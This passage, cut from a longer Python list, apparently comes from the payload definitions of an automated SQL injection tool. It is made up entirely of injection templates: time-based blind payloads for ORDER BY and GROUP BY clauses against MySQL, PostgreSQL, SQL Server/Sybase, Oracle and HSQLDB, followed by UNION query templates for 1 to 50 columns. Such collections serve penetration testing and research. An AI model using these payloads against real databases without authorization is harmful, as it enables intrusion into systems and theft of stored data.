WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)', 'clause': [2, 3], 'level': 4, 'request': {'payload': ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))"}, 'vector': ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))", 'details': {'dbms': 'MySQL', 'dbms_version': '<= 5.0.11'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 3, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))', 'details': {'dbms': 'PostgreSQL', 'dbms_version': '> 8.1'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)', 'clause': [2, 3], 'level': 4, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause', 'clause': [2, 3], 'level': 3, 'request': {'payload': ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))"}, 'vector': ",(SELECT (CASE WHEN ([INFERENCE]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)', 'clause': [2, 3], 'level': 4, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)', 'clause': [2, 3], 'level': 3, 'request': {'payload': ',(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)'}, 'vector': ',(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)', 'clause': [2, 3], 'level': 3, 'request': {'payload': ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, 'vector': ",(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)', 'clause': [2, 3], 'level': 4, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)', 'clause': [2, 3], 'level': 4, 'request': {'comment': '--', 'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)', 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 1.7.2'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)', 'clause': [2, 3], 'level': 4, 'request': {'payload': ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))"}, 'vector': ",(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))", 'details': {'dbms': 'HSQLDB', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'Generic UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom)', 'clause': [1, 2, 3, 4, 5], 'level': 1, 'request': {'comment': '-- -', 'char': '[CHAR]', 'payload': None, 'columns': '[COLSTART]-[COLSTOP]'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom)', 'clause': [1, 2, 3, 4, 5], 'level': 1, 'request': {'comment': '-- -', 'char': 'NULL', 'payload': None, 'columns': '[COLSTART]-[COLSTOP]'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom)', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '-- -', 'char': '[RANDNUM]', 'payload': None, 'columns': '[COLSTART]-[COLSTOP]'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([CHAR]) - 1 to 10 columns', 'clause': [1, 2, 3, 4, 5], 'level': 1, 'request': {'comment': '-- -', 'char': '[CHAR]', 'payload': None, 'columns': '1-10'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query (NULL) - 1 to 10 columns', 'clause': [1, 2, 3, 4, 5], 'level': 1, 'request': {'comment': '-- -', 'char': 'NULL', 'payload': None, 'columns': '1-10'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([RANDNUM]) - 1 to 10 columns', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '-- -', 'char': '[RANDNUM]', 'payload': None, 'columns': '1-10'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([CHAR]) - 11 to 20 columns', 'clause': [1, 2, 3, 4, 5], 'level': 2, 'request': {'comment': '-- -', 'char': '[CHAR]', 'payload': None, 'columns': '11-20'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query (NULL) - 11 to 20 columns', 'clause': [1, 2, 3, 4, 5], 'level': 2, 'request': {'comment': '-- -', 'char': 'NULL', 'payload': None, 'columns': '11-20'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([RANDNUM]) - 11 to 20 columns', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '-- -', 'char': '[RANDNUM]', 'payload': None, 'columns': '11-20'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([CHAR]) - 21 to 30 columns', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '-- -', 'char': '[CHAR]', 'payload': None, 'columns': '21-30'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query (NULL) - 21 to 30 columns', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '-- -', 'char': 'NULL', 'payload': None, 'columns': '21-30'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([RANDNUM]) - 21 to 30 columns', 'clause': [1, 2, 3, 4, 5], 'level': 4, 'request': {'comment': '-- -', 'char': '[RANDNUM]', 'payload': None, 'columns': '21-30'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([CHAR]) - 31 to 40 columns', 'clause': [1, 2, 3, 4, 5], 'level': 4, 'request': {'comment': '-- -', 'char': '[CHAR]', 'payload': None, 'columns': '31-40'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query (NULL) - 31 to 40 columns', 'clause': [1, 2, 3, 4, 5], 'level': 4, 'request': {'comment': '-- -', 'char': 'NULL', 'payload': None, 'columns': '31-40'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([RANDNUM]) - 31 to 40 columns', 'clause': [1, 2, 3, 4, 5], 'level': 5, 'request': {'comment': '-- -', 'char': '[RANDNUM]', 'payload': None, 'columns': '31-40'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([CHAR]) - 41 to 50 columns', 'clause': [1, 2, 3, 4, 5], 'level': 5, 'request': {'comment': '-- -', 'char': '[CHAR]', 'payload': None, 'columns': '41-50'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query (NULL) - 41 to 50 columns', 'clause': [1, 2, 3, 4, 5], 'level': 5, 'request': {'comment': '-- -', 'char': 'NULL', 'payload': None, 'columns': '41-50'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'Generic UNION query ([RANDNUM]) - 41 to 50 columns', 'clause': [1, 2, 3, 4, 5], 'level': 5, 'request': {'comment': '-- -', 'char': '[RANDNUM]', 'payload': None, 'columns': '41-50'}, 'vector': '[UNION]', 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom)', 'clause': [1, 2, 3, 4, 5], 'level': 1, 'request': {'comment': '#', 'char': '[CHAR]', 'payload': None, 'columns': '[COLSTART]-[COLSTOP]'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom)', 'clause': [1, 2, 3, 4, 5], 'level': 1, 'request': {'comment': '#', 'char': 'NULL', 'payload': None, 'columns': '[COLSTART]-[COLSTOP]'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom)', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '#', 'char': '[RANDNUM]', 'payload': None, 'columns': '[COLSTART]-[COLSTOP]'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([CHAR]) - 1 to 10 columns', 'clause': [1, 2, 3, 4, 5], 'level': 1, 'request': {'comment': '#', 'char': '[CHAR]', 'payload': None, 'columns': '1-10'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query (NULL) - 1 to 10 columns', 'clause': [1, 2, 3, 4, 5], 'level': 1, 'request': {'comment': '#', 'char': 'NULL', 'payload': None, 'columns': '1-10'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([RANDNUM]) - 1 to 10 columns', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '#', 'char': '[RANDNUM]', 'payload': None, 'columns': '1-10'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([CHAR]) - 11 to 20 columns', 'clause': [1, 2, 3, 4, 5], 'level': 2, 'request': {'comment': '#', 'char': '[CHAR]', 'payload': None, 'columns': '11-20'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query (NULL) - 11 to 20 columns', 'clause': [1, 2, 3, 4, 5], 'level': 2, 'request': {'comment': '#', 'char': 'NULL', 'payload': None, 'columns': '11-20'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([RANDNUM]) - 11 to 20 columns', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '#', 'char': '[RANDNUM]', 'payload': None, 'columns': '11-20'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([CHAR]) - 21 to 30 columns', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '#', 'char': '[CHAR]', 'payload': None, 'columns': '21-30'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query (NULL) - 21 to 30 columns', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'comment': '#', 'char': 'NULL', 'payload': None, 'columns': '21-30'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([RANDNUM]) - 21 to 30 columns', 'clause': [1, 2, 3, 4, 5], 'level': 4, 'request': {'comment': '#', 'char': '[RANDNUM]', 'payload': None, 'columns': '21-30'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([CHAR]) - 31 to 40 columns', 'clause': [1, 2, 3, 4, 5], 'level': 4, 'request': {'comment': '#', 'char': '[CHAR]', 'payload': None, 'columns': '31-40'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query (NULL) - 31 to 40 columns', 'clause': [1, 2, 3, 4, 5], 'level': 4, 'request': {'comment': '#', 'char': 'NULL', 'payload': None, 'columns': '31-40'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([RANDNUM]) - 31 to 40 columns', 'clause': [1, 2, 3, 4, 5], 'level': 5, 'request': {'comment': '#', 'char': '[RANDNUM]', 'payload': None, 'columns': '31-40'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([CHAR]) - 41 to 50 columns', 'clause': [1, 2, 3, 4, 5], 'level': 5, 'request': {'comment': '#', 'char': '[CHAR]', 'payload': None, 'columns': '41-50'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query (NULL) - 41 to 50 columns', 'clause': [1, 2, 3, 4, 5], 'level': 5, 'request': {'comment': '#', 'char': 'NULL', 'payload': None, 'columns': '41-50'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}, {'risk': 1, 'title': 'MySQL UNION query ([RANDNUM]) - 41 to 50 columns', 'clause': [1, 2, 3, 4, 5], 'level': 5, 'request': {'comment': '#', 'char': '[RANDNUM]', 'payload': None, 'columns': '41-50'}, 'vector': '[UNION]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'union': None}, 'stype': 6}]